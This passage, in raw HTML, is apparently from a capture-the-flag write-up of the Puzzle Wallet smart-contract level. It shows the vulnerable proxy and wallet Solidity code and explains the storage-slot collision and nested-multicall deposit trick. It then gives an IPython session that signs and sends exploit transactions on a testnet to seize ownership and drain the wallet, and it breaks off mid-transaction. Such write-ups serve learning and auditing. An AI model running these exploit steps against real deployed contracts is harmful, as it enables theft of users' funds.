class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">pragma experimental <span class="title class_">ABIEncoderV</span>2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../helpers/UpgradeableProxy-08.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">PuzzleProxy</span> is <span class="title class_">UpgradeableProxy</span> &#123;</span><br><span class="line">    address public pendingAdmin;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _admin, address _implementation, bytes memory _initData</span>) <span class="title class_">UpgradeableProxy</span>(_implementation, _initData) &#123;</span><br><span class="line">        admin = _admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyAdmin &#123;</span><br><span class="line">      <span class="built_in">require</span>(msg.<span class="property">sender</span> == admin, <span class="string">&quot;Caller is not the admin&quot;</span>);</span><br><span class="line">      _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">proposeNewAdmin</span>(<span class="params">address _newAdmin</span>) external &#123;</span><br><span class="line">        pendingAdmin = _newAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">approveNewAdmin</span>(<span class="params">address _expectedAdmin</span>) external onlyAdmin &#123;</span><br><span class="line">        <span class="built_in">require</span>(pendingAdmin == _expectedAdmin, <span class="string">&quot;Expected new admin by the current admin is not the pending admin&quot;</span>);</span><br><span class="line">        admin = pendingAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">upgradeTo</span>(<span class="params">address _newImplementation</span>) external onlyAdmin &#123;</span><br><span class="line">        <span class="title function_">_upgradeTo</span>(_newImplementation);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">PuzzleWallet</span> &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public maxBalance;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> bool) public whitelisted;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) public balances;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">init</span>(<span class="params">uint256 _maxBalance</span>) public &#123;</span><br><span class="line">        <span class="built_in">require</span>(maxBalance == <span class="number">0</span>, <span class="string">&quot;Already initialized&quot;</span>);</span><br><span class="line">        maxBalance = _maxBalance;</span><br><span class="line">        owner = msg.<span class="property">sender</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyWhitelisted &#123;</span><br><span class="line">        <span class="built_in">require</span>(whitelisted[msg.<span class="property">sender</span>], <span class="string">&quot;Not whitelisted&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setMaxBalance</span>(<span class="params">uint256 _maxBalance</span>) external onlyWhitelisted &#123;</span><br><span class="line">      <span class="built_in">require</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> == <span class="number">0</span>, <span class="string">&quot;Contract balance is not 0&quot;</span>);</span><br><span class="line">      maxBalance = _maxBalance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">addToWhitelist</span>(<span class="params">address addr</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner, <span class="string">&quot;Not the owner&quot;</span>);</span><br><span class="line">        whitelisted[addr] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params"></span>) external payable onlyWhitelisted &#123;</span><br><span class="line">      <span class="built_in">require</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> &lt;= maxBalance, <span class="string">&quot;Max balance reached&quot;</span>);</span><br><span class="line">      balances[msg.<span class="property">sender</span>] += msg.<span class="property">value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">execute</span>(<span class="params">address to, uint256 value, bytes calldata data</span>) external payable onlyWhitelisted &#123;</span><br><span class="line">        <span class="built_in">require</span>(balances[msg.<span class="property">sender</span>] &gt;= value, <span class="string">&quot;Insufficient balance&quot;</span>);</span><br><span class="line">        balances[msg.<span class="property">sender</span>] -= value;</span><br><span class="line">        (bool success, ) = to.<span class="property">call</span>&#123; <span class="attr">value</span>: value &#125;(data);</span><br><span class="line">        <span class="built_in">require</span>(success, <span class="string">&quot;Execution failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">multicall</span>(<span class="params">bytes[] calldata data</span>) external payable onlyWhitelisted &#123;</span><br><span class="line">        bool depositCalled = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; data.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            bytes memory _data = data[i];</span><br><span class="line">            bytes4 selector;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                selector := <span class="title function_">mload</span>(<span class="title function_">add</span>(_data, <span class="number">32</span>))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (selector == <span class="variable language_">this</span>.<span class="property">deposit</span>.<span class="property">selector</span>) &#123;</span><br><span class="line">                <span class="built_in">require</span>(!depositCalled, <span class="string">&quot;Deposit can only be called once&quot;</span>);</span><br><span class="line">                <span class="comment">// Protect against reusing msg.value</span></span><br><span class="line">                depositCalled = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            (bool success, ) = <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="title function_">delegatecall</span>(data[i]);</span><br><span class="line">            <span class="built_in">require</span>(success, <span class="string">&quot;Error while delegating call&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This contract uses upgradable proxy so they can change the logic of the contract if needed, so this wallet contract has <code>multicall</code> functionality which checks if we are making multiple donations in a same call. look at that made me suspicious, since <code>msg.value</code> doesnâ€™t change, calling the deposit function increases the funds multiple times of <code>msg.value</code> without actually sending them to the wallet multiple times. so if we are able to increace our funds without actually paying them, then we can withdraw all the funds of the contract. But the contract is checking if we are calling <code>deposit</code> function multiple times, but if we made a <code>multicall</code> to recure itself then it is possible to call <code>deposite</code> multiple times since the function is checking <code>depositCalled</code> bool and it is inside the <code>multicall</code> function, calling a <code>multicall</code> inside a <code>multicall</code> the <code>depositCalled</code> bool will be reset to false. however we canâ€™t do all this without becoming <code>whitelisted</code> and we cannot be <code>whitelisted</code> unless we bocome the <code>owner</code> of this contract, this can be achived because the proxy contract has an address variable named <code>pendingAdmin</code> located at the same slot as the <code>owner</code> variable in the logic contract. since the proxy uses the <code>delegatecall</code> if become the <code>pendingAdmin</code> of the proxy contract. we become the <code>owner</code> of the logic contract allowing us to become <code>whitelisted</code> and to drain the funds. however our goal is claim the ownership of the proxy contract to achive that we can set <code>maxBalance</code> to our address similarly to <code>pendingAdmin</code> and <code>owner</code>, <code>maxBalance</code> and <code>Admin</code> are in same slot, changing the <code>maxBalance</code> to our address changes the <code>Admin</code> in the proxy contract.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">In [<span class="number">547</span>]: proposeadmin_selector = io.soliditySha3(abi_types=[<span class="string">&#x27;string&#x27;</span>],values=[<span class="string">&#x27;proposeNewAdmin(address)&#x27;</span>])[:<span class="number">4</span>].<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">In [<span class="number">548</span>]: proposeadmin_selector</span><br><span class="line">Out[<span class="number">548</span>]: <span class="string">&#x27;0xa6376746&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">549</span>]: calldata = proposeadmin_selector + pub[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">550</span>]: calldata</span><br><span class="line">Out[<span class="number">550</span>]: <span class="string">&#x27;0xa637674600000000000000000000000025Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">551</span>]: tx = &#123;<span class="string">&#x27;to&#x27;</span>: ad, <span class="string">&#x27;from&#x27;</span>: pub, <span class="string">&#x27;data&#x27;</span>: calldata, <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>, <span class="string">&#x27;nonce&#x27;</span>: io.eth.get_transaction_count(pub), <span class="string">&#x27;gasPrice&#x27;</span>: io.eth.gas_price&#125;</span><br><span class="line">t</span><br><span class="line">In [<span class="number">552</span>]: tx[<span class="string">&#x27;gas&#x27;</span>] = io.eth.estimate_gas(tx)</span><br><span class="line"></span><br><span class="line">In [<span class="number">553</span>]: tx</span><br><span class="line">Out[<span class="number">553</span>]:</span><br><span class="line">&#123;<span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xbb404C0948221a9AE98eDfc25D5B75B89150DC1A&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;0xa637674600000000000000000000000025Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>,</span><br><span class="line"> <span class="string">&#x27;nonce&#x27;</span>: <span class="number">338</span>,</span><br><span class="line"> <span class="string">&#x27;gasPrice&#x27;</span>: <span class="number">2500000007</span>,</span><br><span class="line"> <span class="string">&#x27;gas&#x27;</span>: <span class="number">26158</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">554</span>]: stx = io.eth.account.sign_transaction(tx,p)</span><br><span class="line"></span><br><span class="line">In [<span class="number">555</span>]: hsh = io.eth.send_raw_transaction(stx.rawTransaction)</span><br><span class="line"></span><br><span class="line">In [<span class="number">556</span>]: io.eth.wait_for_transaction_receipt(hsh)</span><br><span class="line">Out[<span class="number">556</span>]:</span><br><span class="line">AttributeDict(&#123;<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xe5e93b3acaeb9470e03fa62e389a9c3786272bbd2d6ce555d159c9ea5a248cfc&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">2383194</span>,</span><br><span class="line"> <span class="string">&#x27;contractAddress&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;cumulativeGasUsed&#x27;</span>: <span class="number">23966</span>,</span><br><span class="line"> <span class="string">&#x27;effectiveGasPrice&#x27;</span>: <span class="number">2500000007</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;gasUsed&#x27;</span>: <span class="number">23966</span>,</span><br><span class="line"> <span class="string">&#x27;logs&#x27;</span>: [],</span><br><span class="line"> <span class="string">&#x27;logsBloom&#x27;</span>: HexBytes(<span class="string">&#x27;0xx27;</span>),</span><br><span class="line"> <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line"> <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xbb404C0948221a9AE98eDfc25D5B75B89150DC1A&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x94e4ff6939b4cb9b3c1f492a480fa7f4302e616e90674b86289e3556aa3f7d31&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;0x0&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">In [<span class="number">557</span>]: io.eth.get_storage_at(ad,<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">557</span>]: HexBytes(<span class="string">&#x27;0x00000000000000000000000025bf651a048be8420997944c92c80e5064c1c5d6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">558</span>]: addtowhitelist_selector = io.soliditySha3(abi_types=[<span class="string">&#x27;string&#x27;</span>],values=[<span class="string">&#x27;addToWhitelist(address)&#x27;</span>])[:<span class="number">4</span>].<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">In [<span class="number">559</span>]: addtowhitelist_selector</span><br><span class="line">Out[<span class="number">559</span>]: <span class="string">&#x27;0xe43252d7&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">560</span>]: calldata = addtowhitelist_selector + pub[<span class="number">2</span>:].zfill(<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">561</span>]: calldata</span><br><span class="line">Out[<span class="number">561</span>]: <span class="string">&#x27;0xe43252d700000000000000000000000025Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">562</span>]: tx = &#123;<span class="string">&#x27;to&#x27;</span>: ad, <span class="string">&#x27;from&#x27;</span>: pub, <span class="string">&#x27;data&#x27;</span>: calldata, <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>, <span class="string">&#x27;nonce&#x27;</span>: io.eth.get_transaction_count(pub), <span class="string">&#x27;gasPrice&#x27;</span>: io.eth.gas_price&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">563</span>]: tx[<span class="string">&#x27;gas&#x27;</span>] = io.eth.estimate_gas(tx)</span><br><span class="line"></span><br><span class="line">In [<span class="number">564</span>]: tx</span><br><span class="line">Out[<span class="number">564</span>]:</span><br><span class="line">&#123;<span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xbb404C0948221a9AE98eDfc25D5B75B89150DC1A&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;0xe43252d700000000000000000000000025Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>,</span><br><span class="line"> <span class="string">&#x27;nonce&#x27;</span>: <span class="number">339</span>,</span><br><span class="line"> <span class="string">&#x27;gasPrice&#x27;</span>: <span class="number">2500000007</span>,</span><br><span class="line"> <span class="string">&#x27;gas&#x27;</span>: <span class="number">33483</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">565</span>]: stx = io.eth.account.sign_transaction(tx,p)</span><br><span class="line"></span><br><span class="line">In [<span class="number">566</span>]: hsh = io.eth.send_raw_transaction(stx.rawTransaction)</span><br><span class="line"></span><br><span class="line">In [<span class="number">567</span>]: io.eth.get_storage_at(ad,<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">567</span>]: HexBytes(<span class="string">&#x27;0x00000000000000000000000025bf651a048be8420997944c92c80e5064c1c5d6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">568</span>]: io.eth.wait_for_transaction_receipt(hsh)</span><br><span class="line">Out[<span class="number">568</span>]:</span><br><span class="line">AttributeDict(&#123;<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xc83921ff00d4046f14c2bf24365c1aa0fb6158e0678329b630b58bfed5dcda70&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">2383196</span>,</span><br><span class="line"> <span class="string">&#x27;contractAddress&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;cumulativeGasUsed&#x27;</span>: <span class="number">31218</span>,</span><br><span class="line"> <span class="string">&#x27;effectiveGasPrice&#x27;</span>: <span class="number">2500000007</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;gasUsed&#x27;</span>: <span class="number">31218</span>,</span><br><span class="line"> <span class="string">&#x27;logs&#x27;</span>: [],</span><br><span class="line"> <span class="string">&#x27;logsBloom&#x27;</span>: HexBytes(<span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line"> <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xbb404C0948221a9AE98eDfc25D5B75B89150DC1A&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0xbf6f02cb48561e75a2972dc7ed8a77bbca502947d647e575e0f93fd7d57b14fb&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;0x0&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">In [<span class="number">569</span>]: calldata = <span class="string">&#x27;&#x27;&#x27;0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000400000000</span></span><br><span class="line"><span class="string">     ...: 0000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">     ...: 00000000000000000000000000a4ac9650d800000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="string">     ...: 00000200000000000000000000000000000000000000000000000000000000000000004d0e30db00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">570</span>]: tx = &#123;<span class="string">&#x27;to&#x27;</span>: ad, <span class="string">&#x27;from&#x27;</span>: pub, <span class="string">&#x27;data&#x27;</span>: calldata, <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>, <span class="string">&#x27;nonce&#x27;</span>: io.eth.get_transaction_count(pub), <span class="string">&#x27;gasPrice&#x27;</span>: io.eth.gas_price&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">571</span>]: io.eth.get_balance(ad)</span><br><span class="line">Out[<span class="number">571</span>]: <span class="number">1000000000000000</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">572</span>]: tx = &#123;<span class="string">&#x27;to&#x27;</span>: ad, <span class="string">&#x27;from&#x27;</span>: pub, <span class="string">&#x27;data&#x27;</span>: calldata, <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>, <span class="string">&#x27;nonce&#x27;</span>: io.eth.get_transaction_count(pub), <span class="string">&#x27;gasPrice&#x27;</span>: io.eth.gas_price, <span class="string">&#x27;value&#x27;</span>: io.eth.get_balance(ad)&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">573</span>]: tx[<span class="string">&#x27;gas&#x27;</span>] = io.eth.estimate_gas(tx)</span><br><span class="line"></span><br><span class="line">In [<span class="number">574</span>]: tx</span><br><span class="line">Out[<span class="number">574</span>]:</span><br><span class="line">&#123;<span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xbb404C0948221a9AE98eDfc25D5B75B89150DC1A&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;0xac9650d800000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000004d0e30db00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a4ac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;chainId&#x27;</span>: <span class="number">11155111</span>,</span><br><span class="line"> <span class="string">&#x27;nonce&#x27;</span>: <span class="number">340</span>,</span><br><span class="line"> <span class="string">&#x27;gasPrice&#x27;</span>: <span class="number">2500000007</span>,</span><br><span class="line"> <span class="string">&#x27;value&#x27;</span>: <span class="number">1000000000000000</span>,</span><br><span class="line"> <span class="string">&#x27;gas&#x27;</span>: <span class="number">64207</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">575</span>]: stx = io.eth.account.sign_transaction(tx,p)</span><br><span class="line"></span><br><span class="line">In [<span class="number">576</span>]: hsh = io.eth.send_raw_transaction(stx.rawTransaction)</span><br><span class="line"></span><br><span class="line">In [<span class="number">577</span>]: io.eth.wait_for_transaction_receipt(hsh)</span><br><span class="line">Out[<span class="number">577</span>]:</span><br><span class="line">AttributeDict(&#123;<span class="string">&#x27;blockHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x43c6b94d62f24476fe8f06976b35d1332511918cf1f00138947959ede1b72138&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;blockNumber&#x27;</span>: <span class="number">2383204</span>,</span><br><span class="line"> <span class="string">&#x27;contractAddress&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;cumulativeGasUsed&#x27;</span>: <span class="number">61724</span>,</span><br><span class="line"> <span class="string">&#x27;effectiveGasPrice&#x27;</span>: <span class="number">2500000007</span>,</span><br><span class="line"> <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;0x25Bf651a048be8420997944C92c80e5064C1c5d6&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;gasUsed&#x27;</span>: <span class="number">61724</span>,</span><br><span class="line"> <span class="string">&#x27;logs&#x27;</span>: [],</span><br><span class="line"> <span class="string">&#x27;logsBloom&#x27;</span>: HexBytes(<span class="string">&#x27;0xx27;</span>),</span><br><span class="line"> <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line"> <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;0xbb404C0948221a9AE98eDfc25D5B75B89150DC1A&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;transactionHash&#x27;</span>: HexBytes(<span class="string">&#x27;0x81d0d7075c855e6432f37526b8aa506660e0f431f10d253878fa17c64a6b65af&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;transactionIndex&#x27;</span>: <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;0x0&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">In [<span class="number">578</span>]: io.eth.get_balance(ad)</span><br><span class="line">Out[<span class="number">578</span>]: <span class="number">2000000000000000</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">579</span>]: calldata = <span class="string">&#x27;&#x27;&#x27;0xb61d27f600000000000000000000000025bf651a048be8420997944c92c80e5064c1c5d600000000000000000000000000000000000000000000000000071afd498d000000000000000000000000000000000000000000000000000000000000000000600000000</span></span><br><span class="line"><span class="string">     ...: 000000000000000000000000000000000000000000000000000000000&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">580</span>]: tx = &#123;<span class="string">&#x27;to&#x27;</span>: ad, <span class="string">&#x27;from&#x27;</span>: pub, <span class="string">&#x27;data&#x27;</span>: calldata, <span 